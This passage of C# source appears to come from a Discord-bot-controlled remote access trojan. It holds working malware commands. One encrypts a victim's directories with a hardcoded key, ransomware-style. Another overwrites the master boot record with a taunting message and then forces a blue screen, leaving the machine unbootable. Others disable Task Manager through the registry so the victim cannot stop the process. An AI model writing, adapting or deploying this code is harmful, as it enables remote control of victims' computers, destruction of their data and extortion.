                        File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\countdown.wav");
                        File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\123.gif");
                    }

                    Thread _Run = new Thread(LoadForm) { IsBackground = true };
                    _Run.Start();
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("encrdir")]
        //[RequireOwner]
        public async Task encrDir(string dir, string typeFilter)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                    dir = dir.Replace("*", " ");
                    Encrypter.Encrypt(dir, typeFilter, "qFQ9M^jP^FRteXBEr77X3R7?yp$++Qy%Z-G@_e3g");
                    await ReplyAsync($"```[Id: { Program.clientId}] finished encrdir [{typeFilter}].```");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("decrdir")]
        //[RequireOwner]
        public async Task decrDir(string dir)
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                    dir = dir.Replace("*", " ");
                    Encrypter.Decrypt(dir, "qFQ9M^jP^FRteXBEr77X3R7?yp$++Qy%Z-G@_e3g");
                    await ReplyAsync($"```[Id: { Program.clientId}] finished decrdir.```");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("mbrkiller")]
        //[RequireOwner]
        public async Task mbrKiller()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");

                    // OVERWRITE MBR
                    var mbrData = new byte[] 
                    { 
                        0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
                        0x04, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
                        0x10, 0xEB, 0xF5, 0xC3, 0x4F, 0x68, 0x20, 0x4E, 0x6F, 0x21, 0x0D, 0x0A, 0x49, 0x74, 0x20, 0x6C,
                        0x6F, 0x6F, 0x6B, 0x73, 0x20, 0x6C, 0x69, 0x6B, 0x65, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x6A, 0x75,
                        0x73, 0x74, 0x20, 0x67, 0x6F, 0x74, 0x20, 0x66, 0x75, 0x63, 0x6B, 0x65, 0x64, 0x20, 0x62, 0x79,
                        0x20, 0x56, 0x49, 0x4F, 0x4C, 0x45, 0x4E, 0x54, 0x2E, 0x0D, 0x0A, 0x59, 0x6F, 0x75, 0x20, 0x77,
                        0x6F, 0x6E, 0x27, 0x74, 0x20, 0x62, 0x65, 0x20, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x74, 0x6F, 0x20,
                        0x72, 0x65, 0x62, 0x6F, 0x6F, 0x74, 0x2C, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x66, 0x75, 0x6E,
                        0x20, 0x3A, 0x29, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
                    };
                    var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                        OpenExisting, 0, IntPtr.Zero);
                    WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);

                    // BSOD
                    System.Diagnostics.Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("disabletaskmgr")]
        //[RequireOwner]
        public async Task disableTaskmgr()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    RegistryKey rk = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                    rk.SetValue("DisableTaskMgr", "1");
                    rk.Close();
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }

        [Command("enabletaskmgr")]
        //[RequireOwner]
        public async Task enableTaskmgr()
        {
            if (Program.target.Contains(Convert.ToString(Context.User.Id)))
            {
                if (IsAdministrator)
                {
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                    rk.DeleteValue("DisableTaskMgr");
                    rk.Close();
                    await ReplyAsync($"[Id: { Program.clientId}] Ok.");
                }
                else
                {
                    await ReplyAsync($"```[Id: { Program.clientId}] admin perms required```");
                }
            }
        }
        #endregion
    }
}